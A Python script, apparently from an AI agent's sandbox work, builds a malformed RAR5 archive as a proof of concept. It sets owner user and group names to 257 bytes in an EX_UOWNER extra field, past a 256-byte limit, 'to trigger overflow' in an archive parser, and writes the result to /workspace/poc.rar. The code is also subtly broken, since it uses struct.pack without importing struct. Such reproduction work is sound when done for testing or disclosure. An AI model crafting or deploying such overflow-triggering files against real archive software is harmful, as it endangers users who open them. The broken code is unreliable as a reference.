import zlib

def encode_varint(value):
    """Encode a value as RAR5-style varint (little-endian, 7 bits per byte, MSB=continuation)"""
    result = bytearray()
    while value >= 0x80:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.append(value & 0x7F)
    return bytes(result)

def build_rar5_poc():
    # RAR5 magic: "Rar!\x1a\x07\x01\x00"
    magic = b"Rar!\x1a\x07\x01\x00"
    
    # ===== MAIN base block =====
    main_header_data = bytearray()
    
    # archive_flags: no special flags (0)
    main_header_data.extend(encode_varint(0))
    
    # No extra data for main header
    
    # Build the full main block: header_id, header_flags, then header data
    main_block = bytearray()
    main_block.extend(encode_varint(0x01))  # header_id = HEAD_MAIN
    main_block.extend(encode_varint(0x00))  # header_flags = 0
    main_block.extend(main_header_data)
    
    # CRC32 of the header data (everything after CRC32 field)
    main_crc = zlib.crc32(bytes(main_block)) & 0xFFFFFFFF
    
    # Full main base block
    main_base = bytearray()
    main_base.extend(struct.pack('<I', main_crc))  # CRC32
    main_base.extend(encode_varint(len(main_block)))  # header_size (raw)
    main_base.extend(main_block)
    
    # ===== FILE base block =====
    file_header_data = bytearray()
    
    # extra_data_size for the file extra fields
    # We'll put the owner extra data here
    extra_data_payload = bytearray()
    
    # EX_UOWNER extra field (id=0x06)
    # flags: OWNER_USER_NAME (0x01) | OWNER_GROUP_NAME (0x02)
    owner_flags = 0x01 | 0x02
    extra_data_payload.extend(encode_varint(owner_flags))
    
    # OWNER_USER_NAME: value_len > 256 to trigger overflow
    # We need value_len to be > OWNER_MAXNAMELEN (256)
    user_name_len = 257
    extra_data_payload.extend(encode_varint(user_name_len))
    extra_data_payload.extend(b'A' * user_name_len)
    
    # OWNER_GROUP_NAME: value_len > 256
    group_name_len = 257
    extra_data_payload.extend(encode_varint(group_name_len))
    extra_data_payload.extend(b'B' * group_name_len)
    
    # The extra field in the file header: extra_field_size, extra_field_id, then payload
    extra_field = bytearray()
    extra_field.extend(encode_varint(len(extra_data_payload)))  # extra_field_size
    extra_field.extend(encode_varint(0x06))  # extra_field_id = EX_UOWNER
    extra_field.extend(extra_data_payload)
    
    extra_data_size = len(extra_field)
    file_header_data.extend(encode_varint(extra_data_size))  # extra_data_size
    
    # data_size (HFL_DATA is set)
    data_size = 0  # No actual data, just header
    file_header_data.extend(encode_varint(data_size))
    
    # file_flags: no special flags (0)
    file_header_data.extend(encode_varint(0x00))
    
    # unpacked_size
    file_header_data.extend(encode_varint(0))
    
    # file_attr
    file_header_data.extend(encode_varint(0x0000))  # mode
    
    # compression_info: method=0, version=0, window_size=0
    file_header_data.extend(encode_varint(0))
    
    # host_os = HOST_UNIX (1)
    file_header_data.extend(encode_varint(1))
    
    # name_size and name
    file_name = b"test.txt"
    file_header_data.extend(encode_varint(len(file_name)))
    file_header_data.extend(file_name)
    
    # Append the extra field data
    file_header_data.extend(extra_field)
    
    # Build the full file block
    file_block = bytearray()
    file_block.extend(encode_varint(0x02))  # header_id = HEAD_FILE
    file_block.extend(encode_varint(0x0003))  # header_flags = HFL_EXTRA_DATA | HFL_DATA
    file_block.extend(file_header_data)
    
    # CRC32 of the header data
    file_crc = zlib.crc32(bytes(file_block)) & 0xFFFFFFFF
    
    # Full file base block
    file_base = bytearray()
    file_base.extend(struct.pack('<I', file_crc))  # CRC32
    file_base.extend(encode_varint(len(file_block)))  # header_size (raw)
    file_base.extend(file_block)
    
    # ===== ENDARC base block =====
    endarc_block = bytearray()
    endarc_block.extend(encode_varint(0x05))  # header_id = HEAD_ENDARC
    endarc_block.extend(encode_varint(0x00))  # header_flags = 0
    
    endarc_crc = zlib.crc32(bytes(endarc_block)) & 0xFFFFFFFF
    
    endarc_base = bytearray()
    endarc_base.extend(struct.pack('<I', endarc_crc))
    endarc_base.extend(encode_varint(len(endarc_block)))
    endarc_base.extend(endarc_block)
    
    # Combine everything
    poc = magic + bytes(main_base) + bytes(file_base) + bytes(endarc_base)
    return poc

poc = build_rar5_poc()
print(f"PoC size: {len(poc)} bytes")
print(f"First 20 bytes: {poc[:20].hex()}")
print(f"PoC hex dump (first 100 bytes): {' '.join(f'{b:02x}' for b in poc[:100])}")

# Save to file
with open('/workspace/poc.rar', 'wb') as f:
    f.write(poc)
print("Saved to /workspace/poc.rar")
